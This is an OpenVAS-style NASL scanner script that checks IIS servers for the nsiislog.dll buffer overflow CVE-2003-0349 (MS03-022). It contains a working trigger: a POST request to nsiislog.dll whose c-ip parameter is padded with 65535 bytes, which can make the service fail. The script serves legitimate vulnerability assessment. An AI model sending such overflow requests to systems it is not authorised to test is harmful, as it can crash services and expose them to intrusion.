if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.101016" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2009-03-16 23:15:41 +0100 (Mon, 16 Mar 2009)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2003-0349" );
	script_name( "Microsoft MS03-022 security check" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2009 Christian Eric Edjenguele <christian.edjenguele@owasp.org>" );
	script_family( "Windows : Microsoft Bulletins" );
	script_dependencies( "secpod_ms_iis_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "IIS/installed" );
	script_tag( name: "solution", value: "Microsoft has released a patch to correct these issues.
  Please see the references for more information.

  Note: This patch can be installed on systems running Microsoft Windows 2000 Service Pack 2,
  Windows 2000 Service Pack 3 and Microsoft Windows 2000 Service Pack 4.
  This patch has been superseded by the one provided in Microsoft Security Bulletin MS03-019." );
	script_tag( name: "summary", value: "There is a flaw in the way nsiislog.dll processes incoming client requests.
  A vulnerability exists because an attacker could send specially formed HTTP request (communications)
  to the server that could cause IIS to fail or execute code on the user's system." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_xref( name: "URL", value: "http://www.microsoft.com/downloads/details.aspx?FamilyId=F772E131-BBC9-4B34-9E78-F71D9742FED8&displaylang=en" );
	script_xref( name: "URL", value: "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2003/ms03-019" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
hostname = http_host_name( port: port );
remote_exe = "";
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
req = http_get( item: "/scripts/nsiislog.dll", port: port );
send( socket: soc, data: req );
reply = recv( socket: soc, length: 4096 );
if(reply){
	if(ContainsString( reply, "NetShow ISAPI Log Dll" )){
		url_args = make_list( "date",
			 "time",
			 "c-dns",
			 "cs-uri-stem",
			 "c-starttime",
			 "x-duration",
			 "c-rate",
			 "c-status",
			 "c-playerid",
			 "c-playerversion",
			 "c-player-language",
			 "cs(User-Agent)",
			 "cs(Referer)",
			 "c-hostexe" );
		for parameter in url_args {
			remote_exe += parameter + "=vttest&";
		}
		remote_exe += "c-ip=" + crap( 65535 );
		mpclient = NASLString( "POST /", "/scripts/nsiislog.dll", " HTTP/1.0\\r\\n", "Host: ", hostname, "\\r\\n", "User-Agent: ", "NSPlayer/2.0", "\\r\\n", "Content-Type: ", "application/x-www-form-urlencoded", "\\r\\n", "Content-Length: ", strlen( remote_exe ), "\\r\\n\\r\\n" );
		send( socket: soc, data: mpclient );
		response = recv( socket: soc, length: 4096 );
		if(( egrep( pattern: "HTTP/1.[01] 500", string: response ) ) && ( ContainsString( response, "The remote procedure call failed. " ) )){
			security_message( port: port );
		}
	}
}
close( soc );
exit( 0 );

